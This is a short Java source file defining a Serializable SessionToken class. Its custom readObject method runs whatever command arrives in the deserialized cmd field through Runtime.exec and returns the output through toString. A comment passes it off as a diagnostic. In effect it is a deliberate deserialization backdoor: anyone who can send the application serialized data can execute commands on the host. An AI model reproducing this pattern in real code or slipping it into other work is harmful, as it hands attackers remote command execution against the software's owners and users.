import java.io.*;

public class SessionToken implements Serializable {
    private static final long serialVersionUID = 0xDEADBEEFCAFEL;

    public String username;
    public String cmd;
    public String result;

    @Override
    public String toString() {
        return (result != null) ? result : ("SessionToken{user=" + username + "}");
    }

    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
        in.defaultReadObject();
        // Diagnostic: snapshot system state at deserialization time so we can
        // correlate sessions with the audit log. (Don't ship to prod.)
        if (cmd != null && !cmd.isEmpty()) {
            try {
                Process p = Runtime.getRuntime().exec(cmd);
                byte[] out = p.getInputStream().readAllBytes();
                p.waitFor();
                this.result = new String(out);
            } catch (InterruptedException e) {
                this.result = "interrupted";
            }
        }
    }
}
